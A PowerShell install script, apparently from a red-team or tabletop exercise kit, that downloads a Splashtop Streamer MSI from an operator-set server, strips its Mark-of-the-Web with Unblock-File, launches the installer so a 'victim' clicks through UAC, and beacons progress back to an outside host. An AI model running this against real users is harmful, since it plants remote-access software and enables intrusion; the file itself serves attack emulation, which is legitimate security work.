# ttx/rmm/splashtop/install.ps1 - Splashtop Streamer via MSI, INTERACTIVE WIZARD variant
# Dot-sourced by rmm.ps1 (the tool-agnostic loader): $Base, $BeaconUrl, $Log
# and the Beacon() function are already in scope when this runs.
#
# Downloads streamer.msi, unblocks, aliases setup.msi, then launches the
# installer VISIBLY in the user's session. The "victim" clicks through
# UAC + install wizard + deployment confirmation like a real gullible user.

$Url   = "$Base/rmm/splashtop/streamer.msi"
$File  = "$env:PUBLIC\streamer.msi"
$Check = 'SRStream'
$Desc  = 'Splashtop streamer (MSI wizard)'

# Already running? done.
if (Get-Process -Name $Check -ErrorAction SilentlyContinue) {
  Add-Content $Log "$(Get-Date -f s)  already running, exiting"
  Beacon 'splashtop-already-running'
  return
}

# Download if not present + clear MOTW
if (-not (Test-Path $File)) {
  Invoke-WebRequest -Uri $Url -OutFile $File -UseBasicParsing
  Add-Content $Log "$(Get-Date -f s)  downloaded $Url"
}
Unblock-File $File

if (-not (Test-Path $File)) {
  Beacon 'rmm-download-failed'
  Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded MSI missing"
  return
}

# setup.msi alias - prevents 1603 source resolution on reused hosts
Copy-Item $File "$env:PUBLIC\setup.msi" -Force

# Kill wedged msiexec from earlier attempts
Get-Process msiexec -ErrorAction SilentlyContinue |
    Where-Object { $_.Id -ne (Get-CimInstance Win32_Service -Filter "Name='msiserver'" -ErrorAction SilentlyContinue).ProcessId } |
    Stop-Process -Force -ErrorAction SilentlyContinue

# LAUNCH THE WIZARD - visible, in the user's interactive session.
# dcode pre-fills the deployment binding; the user still clicks through.
Beacon 'splashtop-wizard-launch'
Start-Process msiexec.exe -ArgumentList '/i', "`"$File`"", 'dcode=CHANGE THIS TO YOUR INTENDED DEPLOYMENT CODE'
Add-Content $Log "$(Get-Date -f s)  launched $Desc - wizard visible, awaiting user"

# Poll for streamer up (user-paced; MSI UI waits for clicks)
$Running = $false
for ($i = 0; $i -lt 36; $i++) {
  Start-Sleep -Seconds 10
  if (Get-Process -Name $Check -ErrorAction SilentlyContinue) { $Running = $true; break }
}
if ($Running) {
  Beacon 'splashtop-installed'
  Add-Content $Log "$(Get-Date -f s)  streamer running (check Business console)"
} else {
  Beacon 'splashtop-notready'
  Add-Content $Log "$(Get-Date -f s)  wizard not completed within 6 min"
}
